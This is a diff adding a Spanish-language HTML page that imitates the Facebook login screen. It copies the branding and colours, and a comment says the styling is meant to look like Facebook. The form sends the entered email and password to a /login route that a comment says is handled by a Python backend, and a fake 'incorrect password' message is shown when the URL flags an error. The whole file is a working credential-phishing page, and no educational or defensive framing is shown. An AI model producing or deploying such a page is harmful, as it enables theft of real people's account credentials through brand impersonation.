@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – Inicia sesión</title>
+    <style>
+        /* ESTO HACE QUE SE VEA BONITO Y PARECIDO A FACEBOOK */
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .caja {
+            background-color: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 300px;
+        }
+        h1 {
+            color: #1877f1;
+            font-size: 32px;
+            font-weight: bold;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 90%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1877f1;
+        }
+        button {
+            background-color: #1877f1;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 10px 20px;
+            width: 100%;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        a {
+            color: #1877f1;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 15px;
+            display: block;
+        }
+        .error {
+            color: red;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none; /* Oculto por defecto */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="caja">
+        <h1>facebook</h1>
+        <!-- Esta es la forma que envía los datos a Python -->
+        <form action="/login" method="POST">
+            <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        <a href="#">¿Olvidaste tu contraseña?</a>
+        <p class="error" id="msg-error">Tu contraseña era incorrecta.</p>
+    </div>
+
+    <script>
+        // Este pequeño código muestra el mensaje de error si Python lo dice
+        if (window.location.search.includes('error=1')) {
+            document.getElementById('msg-error').style.display = 'block';
+        }
+    </script>
+
+</body>
+</html>
